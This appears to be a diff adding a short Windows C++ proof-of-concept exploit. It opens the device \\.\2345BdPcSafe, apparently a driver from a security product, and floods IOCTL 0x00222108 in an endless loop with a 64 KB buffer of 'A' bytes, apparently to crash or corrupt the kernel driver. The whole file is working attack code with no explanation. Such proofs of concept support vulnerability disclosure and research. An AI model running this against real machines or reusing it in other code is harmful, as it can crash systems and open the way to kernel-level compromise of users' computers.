@@ -1,0 +1,31 @@
+#include "stdafx.h"
+#include <stdio.h>
+#include <tchar.h>
+#include <windows.h>
+
+void send(HANDLE handle, DWORD IOCTL)
+{
+	char *sendbuf = new char[0xFFFF];
+	char *outbuf = new char[0xFFFF];
+	memset(sendbuf, 0x41, 0xFFFF);
+	while(1)
+	{
+		DeviceIoControl(handle, IOCTL, (LPVOID)sendbuf, 0xFFFF, (LPVOID)outbuf, 4, NULL, NULL);
+	}
+	return ;
+}
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+
+	HANDLE hDevice = CreateFile("\\\\.\\2345BdPcSafe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
+	if (hDevice != INVALID_HANDLE_VALUE)
+	{
+		send(hDevice, 0x00222108);
+	}
+	return 0;
+
+}
+
+
+
